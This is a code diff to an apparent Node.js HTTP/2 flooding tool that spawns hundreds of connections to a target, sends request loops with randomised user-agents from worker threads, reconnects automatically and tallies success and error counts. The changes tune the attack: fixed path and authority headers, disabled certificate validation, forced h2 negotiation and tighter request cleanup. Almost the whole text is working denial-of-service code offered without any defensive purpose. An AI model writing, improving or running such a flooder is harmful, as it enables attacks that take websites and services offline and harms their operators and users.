@@ -25,10 +25,6 @@ function randomTag() {
     return TAGS[Math.floor(Math.random() * TAGS.length)];
 }
 
-function randomPath() {
-    return `/${randomTag().replace(/\s+/g, '-')}/${Math.random().toString(36).slice(2, 12)}`;
-}
-
 function randomUA() {
     return `Mozilla/5.0 (${Math.random().toFixed(4)}; V4) ${randomTag()}`;
 }
@@ -104,17 +100,23 @@ if (isMainThread) {
                 inflight.count++;
                 const headers = {
                     ':method': 'GET',
-                    ':path': randomPath(),
-                    'user-agent': randomUA()
+                    ':path': '/',
+                    'user-agent': randomUA(),
+                    ':authority': new URL(target).host,
+                    'accept': '*/*'
                 };
                 const req = client.request(headers);
                 req.on('response', () => {
                     inflight.count--;
                     sendStat('ok');
+                    req.close();
                 });
                 req.on('error', () => {
                     inflight.count--;
                     sendStat('err');
+                });
+                req.on('close', () => {
+                    inflight.count--;
                 });
                 req.end();
                 sendStat('req');
@@ -130,14 +132,18 @@ if (isMainThread) {
         if (Date.now() > end) return;
 
         try {
-            const client = http2.connect(target);
+            const client = http2.connect(target, {
+                settings: { enablePush: false },
+                rejectUnauthorized: false,
+                ALPNProtocols: ['h2']
+            });
             const inflight = { count: 0 };
-            client.on('error', () => client.destroy());
-            client.on('goaway', () => client.close());
-            client.on('close', () => setTimeout(createConnection, getRandomInt(500, 1000)));
             client.on('connect', () => {
                 for (let i = 0; i < 10; i++) sendLoop(client, inflight);
             });
+            client.on('error', () => client.destroy());
+            client.on('goaway', () => client.close());
+            client.on('close', () => setTimeout(createConnection, getRandomInt(500, 1000)));
         } catch {
             setTimeout(createConnection, 1000);
         }
@@ -145,4 +151,4 @@ if (isMainThread) {
 
     const spawns = getRandomInt(500, 1000);
     for (let i = 0; i < spawns; i++) createConnection();
-        }
+}
